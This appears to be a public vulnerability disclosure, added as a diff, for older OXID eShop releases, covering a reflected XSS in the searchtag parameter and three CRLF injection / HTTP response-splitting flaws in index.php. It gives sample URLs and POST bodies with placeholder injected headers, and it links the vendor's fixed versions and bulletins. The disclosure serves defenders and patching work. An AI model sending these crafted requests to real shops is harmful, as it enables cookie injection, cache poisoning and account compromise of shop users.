@@ -1,0 +1,174 @@
+# Exploit Title: OXID eShop v<4.7.11/5.0.11 + v<4.8.4/5.1.4 Multiple Vulnerabilities 
+# Google Dork: -
+# Date: 12/2013
+# Exploit Author: //sToRm 
+# Author mail: storm@sicherheit-online.org
+# Vendor Homepage: http://www.oxid-esales.com
+# Software Link: -
+# Version: All versions < 4.7.11/5.0.11 + All versions < 4.8.4/5.1.4
+# Tested on: Multiple platforms
+# CVE : CVE-2014-2016 + CVE-2014-2017 (reserved)
+
+
+###########################################################################################################
+# XSS vulnerability #######################################################################################
+
+Under certain circumstances, an attacker can trick a user to enter a specially crafted 
+URI or click on a mal-formed link to exploit a cross-site scripting vulnerability that 
+theoretically can be used to gain unauthorized access to a user account or collect 
+sensitive information of this user. 
+
+SAMPLE: -------------------------------------------------------------------------------
+http://HOST/tag/sample/sample-name.html?cur=2&listtype=tag&pgNr=2&searchtag=[XSS]
+---------------------------------------------------------------------------------------
+
+Products:
+
+    OXID eShop Enterprise Edition
+    OXID eShop Professional Edition
+    OXID eShop Community Edition 
+
+Releases: All previous releases 
+Platforms: All releases are affected on all platforms. 
+	
+STATE
+- Resolved in OXID eShop version 4.7.11/5.0.11. and OXID eShop version 4.8.4/5.1.4.
+- A fix for OXID eShop version 4.6.8 is available.
+
+Bulletin: http://wiki.oxidforge.org/Security_bulletins/2014-001
+
+###########################################################################################################
+###########################################################################################################
+
+
+
+
+
+########################################################################################################### 
+# Multiple CRLF injection / HTTP response splitting #######################################################
+
+Under certain circumstances (depending on the browser, OS, PHP-Version), an attacker can trick a user to 
+enter a specially crafted URI or click on a mal-formed link to exploit a HTTP response splitting vulnerability
+that theoretically can be used to poison cache, gain unauthorized access to a user account or collect 
+sensitive information of this user.
+
+A possible exploit by passing such a mal-formed URI could lead to:
+- return of a blank page or a PHP error (depending on one's server configuration)
+- set unsolicited browser cookies 
+
+Products:
+
+    OXID eShop Enterprise Edition
+    OXID eShop Professional Edition
+    OXID eShop Community Edition 
+
+Releases: All previous releases 
+Platforms: All releases are affected on all platforms. 
+
+STATE:
+- Resolved in OXID eShop version 4.7.11/5.0.11. and OXID eShop version 4.8.4/5.1.4.
+- A fix for OXID eShop version 4.6.8 is available. 
+	
+Bulletin: http://wiki.oxidforge.org/Security_bulletins/2014-002
+
+
+Vulnerability details:
+
+########################################################################################################### 
+# 1 # CRLF injection / HTTP response splitting ############################################################
+
+PATH: ROOT/index.php
+PARAMETER: anid
+
+CONCEPT: --------------------------------------------------------------------------------------------------
+actcontrol=start
+&aid=1
+&am=1
+&anid=%0d%0a%20[INJECT:INJECT]
+&cl=start
+&fnc=tobasket
+&lang=0
+&pgNr=0
+&stoken=1
+-----------------------------------------------------------------------------------------------------------
+
+SAMPLE:
+--- POST /index.php HTTP/1.1 ------------------------------------------------------------------------------
+actcontrol=start&aid=1&am=1&anid=%0d%0a%20INJECTED:INJECTED_DATA&cl=start&fnc=tobasket&lang=0&pgNr=0&stoken=1
+-----------------------------------------------------------------------------------------------------------
+###########################################################################################################
+###########################################################################################################
+
+
+
+
+
+###########################################################################################################
+# 2 # CRLF injection / HTTP response splitting ############################################################
+
+PATH: ROOT/index.php
+PARAMETER: cnid
+
+CONCEPT: --------------------------------------------------------------------------------------------------
+actcontrol=details
+&aid=1
+&am=1
+&anid=0
+&cl=details
+&cnid=%0d%0a%20[INJECTED:INJECTED]
+&fnc=tobasket
+&lang=0
+&listtype=list
+&panid=
+&parentid=1
+&stoken=1
+&varselid%5b0%5d=
+-----------------------------------------------------------------------------------------------------------
+
+SAMPLE:
+--- POST /index.php HTTP/1.1 ------------------------------------------------------------------------------
+actcontrol=details&aid=1&am=1&anid=0&cl=details&cnid=%0d%0a%20INJECTED:INJECTED_DATA&fnc=tobasket&lang=0&listtype=list&panid=&parentid=1&stoken=1&varselid%5b0%5d=
+-----------------------------------------------------------------------------------------------------------
+###########################################################################################################
+###########################################################################################################
+
+
+
+
+
+###########################################################################################################
+# 3 # CRLF injection / HTTP response splitting ############################################################
+
+PATH: ROOT/index.php
+PARAMETER: listtype
+
+CONCEPT: --------------------------------------------------------------------------------------------------
+actcontrol=details
+&aid=1
+&am=1
+&anid=0
+&cl=details
+&cnid=0
+&fnc=tobasket
+&lang=0
+&listtype=%0d%0a%20[INJECTED:INJECTED]
+&panid=
+&parentid=0
+&stoken=0
+&varselid%5b0%5d=
+-----------------------------------------------------------------------------------------------------------
+
+SAMPLE:
+--- POST /index.php HTTP/1.1 ------------------------------------------------------------------------------
+actcontrol=details&aid=1&am=1&anid=0&cl=details&cnid=0&fnc=tobasket&lang=0&listtype=%0d%0a%20INJECTED:INJECTED_DATA&panid=&parentid=0&stoken=0&varselid%5b0%5d=
+-----------------------------------------------------------------------------------------------------------
+###########################################################################################################
+###########################################################################################################
+
+
+
+Many greetings to all lunatics and freaks out there who live daily in the code like me and my partners. 
+A thanks to the developers who have responded relatively quickly.
+
+Cheers!
+//sToRm
